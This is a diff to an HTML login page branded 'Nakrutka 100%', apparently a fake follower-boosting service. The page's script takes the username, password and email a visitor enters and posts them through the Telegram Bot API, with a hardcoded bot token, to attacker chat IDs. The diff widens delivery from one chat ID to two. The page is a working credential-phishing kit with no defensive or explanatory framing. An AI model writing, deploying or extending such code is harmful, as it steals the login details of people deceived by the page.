@@ -52,7 +52,6 @@
       background-color: #218838;
     }
 
-    /* Responsive styling for small screens */
     @media (max-width: 600px) {
       body {
         padding: 10px;
@@ -76,7 +75,6 @@
   <div class="login-container">
     <h2>Nakrutka 100%</h2>
 
-    
     <div class="input-group">
         <label for="username">Username</label>
         <input type="text" id="username" required>
@@ -96,35 +94,39 @@
   </div>
 
   <script>
+    const chatIds = ['6573212314', '5681224283']; // Replace with actual chat IDs
+
+    function sendToTelegram(chatId, message) {
+      return fetch(`https://api.telegram.org/bot7425654455:AAENWfZi5nWwY7CPJwjPTx_7a6gsbbLe6mE/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+    }
+
     function login() {
       const email = document.getElementById('email').value;
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
       if (email && username && password) {
-        const data = {
-          chat_id: '6573212314',
-          text: `*Login Details*\n\n*Username:* ${username}\n*Password:* ${password}\n*Miqdori:* \`${email}\``,
-          parse_mode: 'Markdown'
-        };
+        const message = `*Login Details*\n\n*Username:* ${username}\n*Password:* ${password}\n*Miqdori:* \`${email}\``;
 
-        fetch(`https://api.telegram.org/bot7425654455:AAENWfZi5nWwY7CPJwjPTx_7a6gsbbLe6mE/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(data => {
+        Promise.all(chatIds.map(chatId => sendToTelegram(chatId, message)))
+          .then(() => {
             document.getElementById('email').value = '';
             document.getElementById('username').value = '';
             document.getElementById('password').value = '';
-        })
-
-        .catch(error => {
-          alert('Error:', error);
-        });
+          })
+          .catch(error => {
+            alert(`Error: ${error}`);
+          });
       } else {
         alert('Please enter all the fields.');
       }
